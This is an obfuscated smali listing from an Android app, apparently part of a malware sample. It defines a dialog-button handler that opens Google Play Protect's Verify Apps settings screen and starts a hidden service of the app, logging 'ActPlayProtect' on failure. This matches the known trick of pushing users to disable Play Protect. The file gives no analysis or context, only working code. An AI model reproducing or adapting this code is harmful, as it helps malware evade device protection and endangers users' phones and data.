.class Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .locals 3

    const-string p2, "com.google.android.gms"

    const-string v0, "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    invoke-virtual {v1, p2, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :try_start_0
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    invoke-virtual {p2, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->startActivity(Landroid/content/Intent;)V

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->b:Landroid/content/Context;

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->b:Landroid/content/Context;

    const-class v2, Lwocwvy/czyxoxmbauu/slsa/usbvhkriufnc;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p2, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "ERROR"

    const-string v1, "ActPlayProtect"

    invoke-virtual {p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    invoke-interface {p1}, Landroid/content/DialogInterface;->cancel()V

    return-void
.end method
